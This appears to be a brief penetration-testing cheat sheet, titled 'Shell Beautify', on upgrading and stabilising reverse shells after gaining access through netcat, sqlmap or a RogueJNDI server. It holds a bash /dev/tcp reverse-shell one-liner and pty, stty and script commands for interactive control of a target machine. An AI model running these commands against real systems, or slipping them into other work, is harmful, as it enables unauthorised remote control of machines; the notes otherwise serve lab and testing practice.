Shell Beautify


1) Note: To get a proper working shell out of default shell we can use:

We got a reverse shell! In order to have a functional shell though we can issue the following:

These method is used inside netcat to get more stable and working shell

python3 -c 'import pty;pty.spawn("/bin/bash")'

OR

python3 -c 'import pty;pty.spawn("/bin/bash")'

export TERM=xterm

CTRL+Z

stty raw -echo;fg

2) Note: We got the shell in sqlmap, however, it is not very stable & interactive. To make it much stable, we will use the

following payload:

This method is used to bring sqlmap shell into our netcat listener.

bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"

3) Note: Once we receive the output from the Rogue server, a shell spawns on our Netcat listener and we can

upgrade the terminal shell using the following command.

These method is used with RogueJNDI server

script /dev/null -c bash

Changing Terminal Size, mainly used for text editors such as Vim or Nano to run properly:

In our own terminal run,

cd /tmp; stty -a

or

stty size

Get the values of “rows” & “columns”

Then in our target machine shell run,

stty rows <number>

stty cols <number>

or

stty rows <number> cols <number>
